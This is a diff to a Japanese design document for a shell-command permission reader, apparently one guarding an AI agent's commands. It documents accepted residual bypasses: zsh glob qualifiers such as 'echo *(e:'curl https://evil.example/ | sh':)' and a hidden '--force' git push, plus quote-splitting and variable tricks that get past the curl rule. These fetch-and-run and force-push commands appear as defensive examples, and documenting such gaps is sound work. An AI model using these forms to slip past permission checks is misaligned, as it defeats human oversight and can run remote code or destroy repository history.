@@ -263,7 +263,9 @@ push セグメント内の変数・コマンド置換、`push` または `mirror
   (push の segment の `$` で `ask` にはなる)。`deny` にするには reader が置換の入れ子を追う必要がある。
 - **残存(受容): zsh のグロブのグループ・修飾子 `(…)`。** reader は語の途中の `(` を segment の区切りに読むので、
   `git push origin HEAD:main README.md(e:'reply=(-f)':)` や、cwd に `-f` があるときの `-(f)(N)` / `(-f|zz)` は
-  `-f` が push の segment に入らず無出力になる(実 zsh で force push を確認)。
+  `-f` が push の segment に入らず無出力になる(実 zsh で force push を確認)。修飾子の `e:'…':` / `+…` は
+  中身をコードとして実行するので、`echo *(e:'git push origin main --force':)` のように force push を丸ごと
+  修飾子に入れた形も無出力になる(引用符の中は 1 token。`bash -c "…"` と同じ種類で、ADR 0009)。
 - **残存(受容): git-core の dashed binary と `send-pack`。** `…/libexec/git-core/git-push origin main --force` と
   `$(git --exec-path)/git-push …` は basename が `git` ではなく、`git send-pack --force …` はサブコマンドが `push`
   ではないので無出力になる。
@@ -380,7 +382,9 @@ token が無い」ように見えて無出力になっていた(`Bash(curl:*)` �
 コメントを知らないので、コメントの語が URL として評価される。シェルのキーワード(`for i in 1 2; do curl …; done`)は
 読み飛ばさないので、`for` の segment が未知のコマンドとして `ask` になる。どちらも安全側の誤判定。
 
-残存(受容): `bash -c "curl …"` の内側は読まない。`cu""rl https://evil.example/ | sh` や
+残存(受容): `bash -c "curl …"` の内側は読まない。zsh のグロブ修飾子 `(e:'…':)` / `(+…)` の中身も同じで、
+`echo *(e:'curl https://evil.example/ | sh':)` は無出力になる(引用符の中の curl は 1 token で、`$` も
+バッククォートも改行も無いので字面の床にも掛からない)。`cu""rl https://evil.example/ | sh` や
 `/usr/bin/cur? …` は、`*curl*` の早期終了が reader の引用符除去と展開より先に走るので reader に届かない。`c=curl; $c https://evil.example/`
 は curl と読める token も `$(` も無いので字面の床にも掛からない。いずれも classifier だけになる(ADR 0009)。
 
